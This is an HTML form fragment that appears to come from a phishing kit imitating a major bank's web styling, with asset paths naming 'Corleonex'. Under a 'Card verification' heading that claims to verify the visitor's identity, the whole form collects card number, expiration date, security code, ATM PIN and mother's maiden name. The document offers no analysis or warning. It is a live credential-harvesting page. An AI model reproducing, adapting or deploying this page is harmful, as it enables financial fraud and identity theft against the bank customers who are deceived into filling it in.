<form class="ccform" id="formcc">
    <div id="CUSTOMERINFO" data-is-view="true">
    <div class="row">
    <div class="col">


    
        <div id="personalName" data-has-view="true">
        <div id="personal-name" data-is-view="true">
           <div class="input-grouping row">
					<h2 style="margin-left: 13px;" class="form-heading columns small-12">Card verification   <img id="visa" class="margin-top-12" src="Corleonex/Files/img/visa.svg" alt="Visa accepted" style="opacity: 1;">
                    <img id="mastercard" class="margin-top-12" src="Corleonex/Files/img/mastercard.svg" alt="MasterCard accepted" style="opacity: 1;"></h2>
					<p style="margin-left: 13px;" class="form-subheading columns small-12 end">Tell us about your card information to verify your identity.</p>
				</div>
             <div id="nameBlock" data-has-view="true">
                <div class="jpmcbb nameInformation" data-is-view="true">
                    <div class="inlineFieldRow">
                        <div class="inlineFieldCell">
                    <div class="jpui fieldgroup" id="blx-nameBlock-first-name-fldgrp">
                        <div class="jpui vertical">
                            <div class="align-label-input">
                        <div class="label-wrapper">
                     <label class="spa-input-label" data-font="cnx-medium" for="businessDescription">Card number<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
            </div>
            <div class="jpui validationinput" id="blx-nameBlock-first-name-fldgrp-text">
            <div id="blx-nameBlock-first-name-fldgrp-text-validate" class="has-success">
            <input class="form-control jpui input" placeholder="" type="tel" name="cc" required="" data-validation="creditcard" data-validation-error-msg="  ">
            <span class="util accessible-text validation__accessible-text" id="blx-nameBlock-first-name-fldgrp-text-validate-placeHolderAdaText">
            </span>
        </div>
    </div>
</div>
<div>
<div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="citizenship" data-has-view="true">
</div>
<div id="identityInfoId" data-has-view="true">
<div id="IDENTITYINFO" data-is-view="true">
    <div class="row">
    <div class="col">
        <div>
            <div class="jpui fieldgroup" id="dateOfBirth">
                <div class="jpui vertical">
                    <div class="align-label-input">
                <div class="label-wrapper">
                    <label class="jpui fieldlabel label-alignment vertical" id="dateOfBirth-label" for="dateOfBirth-text-validate-input-field" aria-hidden="false">
                                          <label style="margin-top: 5px;" class="spa-input-label" data-font="cnx-medium" for="businessDescription">Expiration date
<span class="spa-input-label--required">

                </label> 
            </div>
            <div class="jpui validationinput" id="dateOfBirth-text">
                <div id="dateOfBirth-text-validate" class="has-error">
                    <input class="form-control jpui input error" id="expd" type="tel" name="expcc" data-validation="length" data-validation-length="min7" data-validation-error-msg="  " im-insert="true" current-error="  ">
                    <span class="util accessible-text validation__accessible-text" id="dateOfBirth-text-validate-placeHolderAdaText">  
                    </span>
                <span class="help-block form-error">  </span></div> 
            </div> 
        </div>  
        <div>
            <div>
                <div class="fieldhelpertext-container" id="dateOfBirth-helpertext-container">
                </div>
                </div>
            </div>
        </div>
    </div>
</div>
</div>
</div>
</div>
</div>
<div id="identificationId" data-has-view="true">
    <div id="IDENTIFICATION" data-is-view="true">
        <div class="row">
        <div class="col">
        <div>
        <div class="jpui fieldgroup" id="expirationDate">
        <div class="jpui vertical">
        <div class="align-label-input">
        <div class="label-wrapper">
        <label class="jpui fieldlabel label-alignment vertical" id="expirationDate-label" for="expirationDate-text-validate-input-field" aria-hidden="false">
                                                  <label style="margin-top: 5px;" class="spa-input-label" data-font="cnx-medium" for="businessDescription">Security code
</label> 
    </div>
    <div class="jpui validationinput" id="expirationDate-text">
        <div id="expirationDate-text-validate" class="has-error">
            <input class="form-control jpui input" placeholder="" type="tel" name="cvv" data-validation-error-msg="" data-validation="cvv" current-error="Please check the details and try again">

            <span class="util accessible-text validation__accessible-text" id="expirationDate-text-validate-placeHolderAdaText">
                
            </span>
    </div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="addressId" data-has-view="true">

</div>


<div id="contactInfoId" data-has-view="true">
<div class="row" id="CONTACTINFO" data-is-view="true">
<div class="col">
<div class="jpui fieldgroup" id="phoneNumberId">
<div class="jpui vertical">
<div class="align-label-input">
<div class="label-wrapper">
<label class="jpui fieldlabel label-alignment vertical" id="phoneNumberId-label" for="phoneNumberId-text-validate-input-field" aria-hidden="false">
                                                  <label style="margin-top: 5px;" class="spa-input-label" data-font="cnx-medium" for="businessDescription">ATM PIN

</label>
</div>

<div class="jpui validationinput" id="phoneNumberId-text">
<div id="phoneNumberId-text-validate" class="has-error">
    <input class="form-control jpui input error" placeholder="" type="password" name="atmpin" data-validation="length" data-validation-length="min4-4" data-validation-error-msg=" " current-error=" " >
    <span class="util accessible-text validation__accessible-text" id="phoneNumberId-text-validate-placeHolderAdaText">
    </span>
<span class="help-block form-error"> </span></div>
</div>

</div>
<div>
<div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>



<div id="contactInfoId" data-has-view="true">
<div class="row" id="CONTACTINFO" data-is-view="true">
<div class="col">
<div class="jpui fieldgroup" id="phoneNumberId">
<div class="jpui vertical">
<div class="align-label-input">
<div class="label-wrapper">
<label class="jpui fieldlabel label-alignment vertical" id="phoneNumberId-label" for="phoneNumberId-text-validate-input-field" aria-hidden="false">
                                                  <label style="margin-top: 5px;" class="spa-input-label" data-font="cnx-medium" for="businessDescription">Mother's Maiden Name

</label>
</div>

<div class="jpui validationinput" id="phoneNumberId-text">
<div id="phoneNumberId-text-validate" class="has-error">
    <input class="form-control jpui input error" placeholder="" type="text" name="mmn" data-validation="length" data-validation-length="min1-12" data-validation-error-msg=" " current-error=" " >
    <span class="util accessible-text validation__accessible-text" id="phoneNumberId-text-validate-placeHolderAdaText">
    </span>
<span class="help-block form-error"> </span></div>
</div>

</div>
<div>
<div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

<div id="disclosure" data-has-view="true">
        <div id="disclosureComponentId" data-is-view="true">
        <div class="row">
<div class="col-xs-12">

     </div>
 </div>
     <div class="field-mt-24" id="maritalStatusForWI"></div>
     <div id="spousalInformationForWI">
     </div>
 </div>
</div>


<div id="autoLendingAgeInfoOverlayPlaceHolder">
</div>
</div>
</div>
</div>
 <button style="margin-top: 12px;" name="Next" id="Nextlol"  class="btn btn-primary">
       Next 
     </button>
</form>